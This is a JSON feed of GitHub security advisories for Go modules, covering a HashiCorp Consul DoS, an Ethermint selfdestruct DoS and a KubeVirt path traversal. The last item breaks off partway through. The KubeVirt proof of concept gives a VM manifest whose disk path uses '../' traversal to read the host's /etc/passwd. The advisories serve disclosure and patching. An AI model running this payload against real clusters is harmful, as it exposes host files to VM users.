{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<p>HashiCorp Consul and Consul Enterprise 1.8.0 through 1.9.14, 1.10.7, and 1.11.2 has Uncontrolled Resource Consumption. Clusters with at least one ingress gateway configured may allow a user with <code>service:write</code> permission to register a specifically-defined service that can cause the Consul server to panic and shutdown. Versions 1.9.15, 1.10.8, and 1.11.3 contain patches for the problem.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24687\">https://nvd.nist.gov/vuln/detail/CVE-2022-24687</a></li>\n<li><a href=\"https://discuss.hashicorp.com\">https://discuss.hashicorp.com</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/\">https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20220331-0006/\">https://security.netapp.com/advisory/ntap-20220331-0006/</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/202208-09\">https://security.gentoo.org/glsa/202208-09</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hj93-5fg3-3chr\">https://github.com/advisories/GHSA-hj93-5fg3-3chr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hj93-5fg3-3chr",
            "title": "[github.com/hashicorp/consul] HashiCorp Consul Ingress Gateway Panic Can Shutdown Servers",
            "date_modified": "2022-08-18T19:07:24.000Z",
            "date_published": "2022-02-25T00:01:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hj93-5fg3-3chr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Consul and Consul Enterprise 1.8.0 through 1.9.14, 1.10.7, and 1.11.2 has Uncontrolled Resource Consumption. Clusters with at least one ingress gateway configured may allow a user with <code>service:write</code> permission to register a specifically-defined service that can cause the Consul server to panic and shutdown. Versions 1.9.15, 1.10.8, and 1.11.3 contain patches for the problem.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24687\">https://nvd.nist.gov/vuln/detail/CVE-2022-24687</a></li>\n<li><a href=\"https://discuss.hashicorp.com\">https://discuss.hashicorp.com</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/\">https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20220331-0006/\">https://security.netapp.com/advisory/ntap-20220331-0006/</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/202208-09\">https://security.gentoo.org/glsa/202208-09</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hj93-5fg3-3chr\">https://github.com/advisories/GHSA-hj93-5fg3-3chr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hj93-5fg3-3chr",
            "title": "[github.com/hashicorp/consul] HashiCorp Consul Ingress Gateway Panic Can Shutdown Servers",
            "date_modified": "2022-08-18T19:07:24.000Z",
            "date_published": "2022-02-25T00:01:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hj93-5fg3-3chr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>HashiCorp Consul and Consul Enterprise 1.8.0 through 1.9.14, 1.10.7, and 1.11.2 has Uncontrolled Resource Consumption. Clusters with at least one ingress gateway configured may allow a user with <code>service:write</code> permission to register a specifically-defined service that can cause the Consul server to panic and shutdown. Versions 1.9.15, 1.10.8, and 1.11.3 contain patches for the problem.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-24687\">https://nvd.nist.gov/vuln/detail/CVE-2022-24687</a></li>\n<li><a href=\"https://discuss.hashicorp.com\">https://discuss.hashicorp.com</a></li>\n<li><a href=\"https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/\">https://discuss.hashicorp.com/t/hcsec-2022-05-consul-ingress-gateway-panic-can-shutdown-servers/</a></li>\n<li><a href=\"https://security.netapp.com/advisory/ntap-20220331-0006/\">https://security.netapp.com/advisory/ntap-20220331-0006/</a></li>\n<li><a href=\"https://security.gentoo.org/glsa/202208-09\">https://security.gentoo.org/glsa/202208-09</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hj93-5fg3-3chr\">https://github.com/advisories/GHSA-hj93-5fg3-3chr</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hj93-5fg3-3chr",
            "title": "[github.com/hashicorp/consul] HashiCorp Consul Ingress Gateway Panic Can Shutdown Servers",
            "date_modified": "2022-08-18T19:07:24.000Z",
            "date_published": "2022-02-25T00:01:01.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hj93-5fg3-3chr"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"vulnerability-report\">Vulnerability Report</h1>\n<h2 id=\"impact\">Impact</h2>\n<p>Smart contract applications that make use of the <code>selfdestruct</code> functionality and their end-users.</p>\n<h2 id=\"classification\">Classification</h2>\n<p>The vulnerability has been classified as <code>high</code> with a CVSS score of <code>8.2</code>. It has the potential to create a denial-of-service to all contracts that can invoke the <a href=\"https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347\"><code>selfdestruct</code></a> function to destroy a smart contract. </p>\n<h2 id=\"users-impacted\">Users Impacted</h2>\n<p>Due to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.</p>\n<h2 id=\"disclosure\">Disclosure</h2>\n<p>In Ethermint running versions before <code>v0.17.2</code>, the contract <code>selfdestruct</code> invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the <a href=\"https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203\"><code>DeleteAccount</code></a> function, all contracts that used the identical bytecode (i.e shared the same <code>CodeHash</code>) will also stop working once one contract invokes <code>selfdestruct</code>, even though the other contracts did not invoke the <code>selfdestruct</code> OPCODE.</p>\n<h3 id=\"additional-details\">Additional Details</h3>\n<p>The same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry <code>bytecode hash --&gt; bytecode</code> which is shared by those contracts. Unfortunately, when one of the contracts invokes <code>selfdestruct</code>, it will remove the corresponding <code>bytecode hash -&gt; bytecode</code> entry, and thus it disables all the contracts that share the same bytecode.</p>\n<p>The attack scenario is as follows:</p>\n<ol>\n<li>The malicious attacker identifies a vulnerable contract that can invoke <code>selfdestruct</code></li>\n<li>The attacker deploys a copy of the contract with identical bytecode</li>\n<li>Finally, the attacker triggers the <code>selfdestruct</code> operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).</li>\n</ol>\n<h2 id=\"patches\">Patches</h2>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>This vulnerability has been patched in Ethermint versions â‰¥<a href=\"https://github.com/evmos/ethermint/releases/tag/v0.18.0\">v0.18.0</a>. The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.</p>\n<h4 id=\"details\">Details</h4>\n<p>The patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.\nAt the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on <code>selfdestruct</code> invocations. This behavior is the same with go-ethereum.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>If a contract is subject to DoS due to this issue, the user can redeploy the same contract, <em>i.e</em> with identical bytecode, so that the original contract's code is recovered.</p>\n<p>The new contract deployment restores the <code>bytecode hash -&gt; bytecode</code> entry in the internal state.</p>\n<h2 id=\"references\">References</h2>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the Core Team in <a href=\"https://discord.gg/evmos\">Discord</a></li>\n</ul>\n<ul>\n<li>Open a discussion in <a href=\"https://github.com/evmos/ethermint/discussions\">evmos/ethermint</a></li>\n<li>Email us at <a href=\"mailto:security@evmos.org\">security@evmos.org</a> for security questions</li>\n<li>For Press, email us at <a href=\"mailto:evmos@west-comms.com\">evmos@west-comms.com</a>.</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to the </p>\n<ul>\n<li>Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.</li>\n<li>Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg\">https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-35936\">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>\n<li><a href=\"https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451\">https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451</a></li>\n<li><a href=\"https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203\">https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f92v-grc2-w2fg\">https://github.com/advisories/GHSA-f92v-grc2-w2fg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f92v-grc2-w2fg",
            "title": "[github.com/Kava-Labs/kava] Ethermint vulnerable to DoS through unintended Contract Selfdestruct",
            "date_modified": "2022-08-18T19:04:47.000Z",
            "date_published": "2022-08-18T19:04:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f92v-grc2-w2fg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"vulnerability-report\">Vulnerability Report</h1>\n<h2 id=\"impact\">Impact</h2>\n<p>Smart contract applications that make use of the <code>selfdestruct</code> functionality and their end-users.</p>\n<h2 id=\"classification\">Classification</h2>\n<p>The vulnerability has been classified as <code>high</code> with a CVSS score of <code>8.2</code>. It has the potential to create a denial-of-service to all contracts that can invoke the <a href=\"https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347\"><code>selfdestruct</code></a> function to destroy a smart contract. </p>\n<h2 id=\"users-impacted\">Users Impacted</h2>\n<p>Due to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.</p>\n<h2 id=\"disclosure\">Disclosure</h2>\n<p>In Ethermint running versions before <code>v0.17.2</code>, the contract <code>selfdestruct</code> invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the <a href=\"https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203\"><code>DeleteAccount</code></a> function, all contracts that used the identical bytecode (i.e shared the same <code>CodeHash</code>) will also stop working once one contract invokes <code>selfdestruct</code>, even though the other contracts did not invoke the <code>selfdestruct</code> OPCODE.</p>\n<h3 id=\"additional-details\">Additional Details</h3>\n<p>The same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry <code>bytecode hash --&gt; bytecode</code> which is shared by those contracts. Unfortunately, when one of the contracts invokes <code>selfdestruct</code>, it will remove the corresponding <code>bytecode hash -&gt; bytecode</code> entry, and thus it disables all the contracts that share the same bytecode.</p>\n<p>The attack scenario is as follows:</p>\n<ol>\n<li>The malicious attacker identifies a vulnerable contract that can invoke <code>selfdestruct</code></li>\n<li>The attacker deploys a copy of the contract with identical bytecode</li>\n<li>Finally, the attacker triggers the <code>selfdestruct</code> operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).</li>\n</ol>\n<h2 id=\"patches\">Patches</h2>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>This vulnerability has been patched in Ethermint versions â‰¥<a href=\"https://github.com/evmos/ethermint/releases/tag/v0.18.0\">v0.18.0</a>. The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.</p>\n<h4 id=\"details\">Details</h4>\n<p>The patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.\nAt the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on <code>selfdestruct</code> invocations. This behavior is the same with go-ethereum.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>If a contract is subject to DoS due to this issue, the user can redeploy the same contract, <em>i.e</em> with identical bytecode, so that the original contract's code is recovered.</p>\n<p>The new contract deployment restores the <code>bytecode hash -&gt; bytecode</code> entry in the internal state.</p>\n<h2 id=\"references\">References</h2>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the Core Team in <a href=\"https://discord.gg/evmos\">Discord</a></li>\n</ul>\n<ul>\n<li>Open a discussion in <a href=\"https://github.com/evmos/ethermint/discussions\">evmos/ethermint</a></li>\n<li>Email us at <a href=\"mailto:security@evmos.org\">security@evmos.org</a> for security questions</li>\n<li>For Press, email us at <a href=\"mailto:evmos@west-comms.com\">evmos@west-comms.com</a>.</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to the </p>\n<ul>\n<li>Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.</li>\n<li>Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg\">https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-35936\">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>\n<li><a href=\"https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451\">https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451</a></li>\n<li><a href=\"https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203\">https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f92v-grc2-w2fg\">https://github.com/advisories/GHSA-f92v-grc2-w2fg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f92v-grc2-w2fg",
            "title": "[github.com/crypto-org-chain/cronos] Ethermint vulnerable to DoS through unintended Contract Selfdestruct",
            "date_modified": "2022-08-18T19:04:47.000Z",
            "date_published": "2022-08-18T19:04:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f92v-grc2-w2fg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"vulnerability-report\">Vulnerability Report</h1>\n<h2 id=\"impact\">Impact</h2>\n<p>Smart contract applications that make use of the <code>selfdestruct</code> functionality and their end-users.</p>\n<h2 id=\"classification\">Classification</h2>\n<p>The vulnerability has been classified as <code>high</code> with a CVSS score of <code>8.2</code>. It has the potential to create a denial-of-service to all contracts that can invoke the <a href=\"https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347\"><code>selfdestruct</code></a> function to destroy a smart contract. </p>\n<h2 id=\"users-impacted\">Users Impacted</h2>\n<p>Due to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.</p>\n<h2 id=\"disclosure\">Disclosure</h2>\n<p>In Ethermint running versions before <code>v0.17.2</code>, the contract <code>selfdestruct</code> invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the <a href=\"https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203\"><code>DeleteAccount</code></a> function, all contracts that used the identical bytecode (i.e shared the same <code>CodeHash</code>) will also stop working once one contract invokes <code>selfdestruct</code>, even though the other contracts did not invoke the <code>selfdestruct</code> OPCODE.</p>\n<h3 id=\"additional-details\">Additional Details</h3>\n<p>The same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry <code>bytecode hash --&gt; bytecode</code> which is shared by those contracts. Unfortunately, when one of the contracts invokes <code>selfdestruct</code>, it will remove the corresponding <code>bytecode hash -&gt; bytecode</code> entry, and thus it disables all the contracts that share the same bytecode.</p>\n<p>The attack scenario is as follows:</p>\n<ol>\n<li>The malicious attacker identifies a vulnerable contract that can invoke <code>selfdestruct</code></li>\n<li>The attacker deploys a copy of the contract with identical bytecode</li>\n<li>Finally, the attacker triggers the <code>selfdestruct</code> operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).</li>\n</ol>\n<h2 id=\"patches\">Patches</h2>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>This vulnerability has been patched in Ethermint versions â‰¥<a href=\"https://github.com/evmos/ethermint/releases/tag/v0.18.0\">v0.18.0</a>. The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.</p>\n<h4 id=\"details\">Details</h4>\n<p>The patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.\nAt the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on <code>selfdestruct</code> invocations. This behavior is the same with go-ethereum.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>If a contract is subject to DoS due to this issue, the user can redeploy the same contract, <em>i.e</em> with identical bytecode, so that the original contract's code is recovered.</p>\n<p>The new contract deployment restores the <code>bytecode hash -&gt; bytecode</code> entry in the internal state.</p>\n<h2 id=\"references\">References</h2>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the Core Team in <a href=\"https://discord.gg/evmos\">Discord</a></li>\n</ul>\n<ul>\n<li>Open a discussion in <a href=\"https://github.com/evmos/ethermint/discussions\">evmos/ethermint</a></li>\n<li>Email us at <a href=\"mailto:security@evmos.org\">security@evmos.org</a> for security questions</li>\n<li>For Press, email us at <a href=\"mailto:evmos@west-comms.com\">evmos@west-comms.com</a>.</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to the </p>\n<ul>\n<li>Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.</li>\n<li>Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg\">https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-35936\">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>\n<li><a href=\"https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451\">https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451</a></li>\n<li><a href=\"https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203\">https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f92v-grc2-w2fg\">https://github.com/advisories/GHSA-f92v-grc2-w2fg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f92v-grc2-w2fg",
            "title": "[github.com/evmos/evmos] Ethermint vulnerable to DoS through unintended Contract Selfdestruct",
            "date_modified": "2022-08-18T19:04:47.000Z",
            "date_published": "2022-08-18T19:04:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f92v-grc2-w2fg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"vulnerability-report\">Vulnerability Report</h1>\n<h2 id=\"impact\">Impact</h2>\n<p>Smart contract applications that make use of the <code>selfdestruct</code> functionality and their end-users.</p>\n<h2 id=\"classification\">Classification</h2>\n<p>The vulnerability has been classified as <code>high</code> with a CVSS score of <code>8.2</code>. It has the potential to create a denial-of-service to all contracts that can invoke the <a href=\"https://ethereum.stackexchange.com/questions/315/why-are-selfdestructs-used-in-contract-programming#347\"><code>selfdestruct</code></a> function to destroy a smart contract. </p>\n<h2 id=\"users-impacted\">Users Impacted</h2>\n<p>Due to the successfully coordinated security vulnerability disclosure, no smart contracts were impacted through the use of this vulnerability. Smart contract states and storage values are not affected by this vulnerability. User funds and balances are safe.</p>\n<h2 id=\"disclosure\">Disclosure</h2>\n<p>In Ethermint running versions before <code>v0.17.2</code>, the contract <code>selfdestruct</code> invocation permanently removes the corresponding bytecode from the internal database storage. However, due to a bug in the <a href=\"https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203\"><code>DeleteAccount</code></a> function, all contracts that used the identical bytecode (i.e shared the same <code>CodeHash</code>) will also stop working once one contract invokes <code>selfdestruct</code>, even though the other contracts did not invoke the <code>selfdestruct</code> OPCODE.</p>\n<h3 id=\"additional-details\">Additional Details</h3>\n<p>The same contract bytecode can be deployed multiple times to create multiple contract instances. In the internal database, the bytecode is stored as a key-value entry <code>bytecode hash --&gt; bytecode</code> which is shared by those contracts. Unfortunately, when one of the contracts invokes <code>selfdestruct</code>, it will remove the corresponding <code>bytecode hash -&gt; bytecode</code> entry, and thus it disables all the contracts that share the same bytecode.</p>\n<p>The attack scenario is as follows:</p>\n<ol>\n<li>The malicious attacker identifies a vulnerable contract that can invoke <code>selfdestruct</code></li>\n<li>The attacker deploys a copy of the contract with identical bytecode</li>\n<li>Finally, the attacker triggers the <code>selfdestruct</code> operation on their redeployed contract, actively causing a DoS on the original and vulnerable contract. All transactions will fail until a workaround is used (see below).</li>\n</ol>\n<h2 id=\"patches\">Patches</h2>\n<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>\n<p>This vulnerability has been patched in Ethermint versions â‰¥<a href=\"https://github.com/evmos/ethermint/releases/tag/v0.18.0\">v0.18.0</a>. The patch has state machine-breaking changes for applications using Ethermint so a coordinated upgrade procedure is required.</p>\n<h4 id=\"details\">Details</h4>\n<p>The patch removes the bytecode deletion logic, i.e. contract bytecodes are never deleted from the internal database after the patch.\nAt the moment, Ethermint does not track how many times each bytecode is used, and thus it cannot determine if it is safe to delete a particular bytecode on <code>selfdestruct</code> invocations. This behavior is the same with go-ethereum.</p>\n<h2 id=\"workarounds\">Workarounds</h2>\n<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>\n<p>If a contract is subject to DoS due to this issue, the user can redeploy the same contract, <em>i.e</em> with identical bytecode, so that the original contract's code is recovered.</p>\n<p>The new contract deployment restores the <code>bytecode hash -&gt; bytecode</code> entry in the internal state.</p>\n<h2 id=\"references\">References</h2>\n<p><em>Are there any links users can visit to find out more?</em></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Reach out to the Core Team in <a href=\"https://discord.gg/evmos\">Discord</a></li>\n</ul>\n<ul>\n<li>Open a discussion in <a href=\"https://github.com/evmos/ethermint/discussions\">evmos/ethermint</a></li>\n<li>Email us at <a href=\"mailto:security@evmos.org\">security@evmos.org</a> for security questions</li>\n<li>For Press, email us at <a href=\"mailto:evmos@west-comms.com\">evmos@west-comms.com</a>.</li>\n</ul>\n<h3 id=\"credits\">Credits</h3>\n<p>Thanks to the </p>\n<ul>\n<li>Cronos Team: @yihuang and @tomtau for discovering the issue, @gakuzen-crypto, @polycryptics, @FinnZhangCrypto, @wilson-ang, @brianatcrypto for the impact analysis.</li>\n<li>Evmos Team: @facs95 for patching the issue and @fedekunze for managing the release and coordinating between teams.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg\">https://github.com/evmos/ethermint/security/advisories/GHSA-f92v-grc2-w2fg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-35936\">https://nvd.nist.gov/vuln/detail/CVE-2022-35936</a></li>\n<li><a href=\"https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451\">https://github.com/evmos/ethermint/commit/144741832007a26dbe950512acbda4ed95b2a451</a></li>\n<li><a href=\"https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203\">https://github.com/evmos/ethermint/blob/c9d42d667b753147977a725e98ed116c933c76cb/x/evm/keeper/statedb.go#L199-L203</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-f92v-grc2-w2fg\">https://github.com/advisories/GHSA-f92v-grc2-w2fg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-f92v-grc2-w2fg",
            "title": "[github.com/evmos/ethermint] Ethermint vulnerable to DoS through unintended Contract Selfdestruct",
            "date_modified": "2022-08-18T19:04:47.000Z",
            "date_published": "2022-08-18T19:04:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-f92v-grc2-w2fg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p><strong>Summary</strong>\nAs part of a Kubevirt audit performed by NCC group, a finding dealing with systemic lack of path sanitization which leads to a path traversal was identified.  Google tested the exploitability of the paths in the audit report and identified that when combined with another vulnerability one of the paths leads to an arbitrary file read on the host from the VM.</p>\n<p>The read operations are limited to files which are publicly readable or which are readable for UID 107 or GID 107. /proc/self/&lt;&gt; is not accessible.</p>\n<p><strong>Severity</strong></p>\n<p>Moderate - The vulnerability is proven to exist in an open source version of KubeVirt by NCC Group while being combined with Systemic Lack of Path Sanitization, which leads to Path traversal.</p>\n<p><strong>Proof of Concept</strong></p>\n<p>The initial VMI specifications can be written as such to reproduce the issue:</p>\n<pre><code>\napiVersion: kubevirt.io/v1\nkind: VirtualMachineInstance\nmetadata:\n  name: vmi-fedora\nspec:\n  domain:\n    devices:\n      disks:\n      - disk:\n          bus: virtio\n        name: containerdisk\n      - disk:\n          bus: virtio\n        name: cloudinitdisk\n      - disk:\n          bus: virtio\n        name: containerdisk1\n      rng: {}\n    resources:\n      requests:\n        memory: 1024M\n  terminationGracePeriodSeconds: 0\n  volumes:\n  - containerDisk:\n      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0\n    name: containerdisk\n  - containerDisk:\n      image: quay.io/kubevirt/cirros-container-disk-demo:v0.52.0\n      path: test3/../../../../../../../../etc/passwd\n    name: containerdisk1\n  - cloudInitNoCloud:\n      userData: |\n        #!/bin/sh\n        echo 'just something to make cirros happy'\n    name: cloudinitdisk\n\n</code></pre>\n<p>The VMI can then be started through kubectl apply -f vm-test-ncc.yaml.\nThe requested file is accessible once the VM is up and can be accessed under /dev/vdc.</p>\n<p>Depending on the environment, path may contain more or less /.., something that can easily be tested by checking the events until the VMI can start without failure.\nRestrictions </p>\n<p>SELinux may mitigate this vulnerability.</p>\n<p>When using a node with selinux, selinux denies the access and the VM start was aborted:</p>\n<pre><code>\n19s         Warning   SyncFailed                virtualmachineinstance/vmi-fedora    server error. command SyncVMI failed: \"preparing ephemeral container disk images failed: stat /var/run/kubevirt/container-disks/disk_0.img: permission denied\"\n\ntype=AVC msg=audit(1651828898.296:1266): avc:  denied  { setattr } for  pid=44402 comm=\"rpc-worker\" name=\"passwd\" dev=\"vda1\" ino=691477 scontext=system_u:system_r:virt_launcher.process:s0:c255,c849 tcontext=system_u:object_r:passwd_file_t:s0 tclass=file permissive=1\n</code></pre>\n<p>After making selinux permissive the VM can boot and access /etc/passwd from the node within the guest:</p>\n<pre><code>\n$ sudo cat 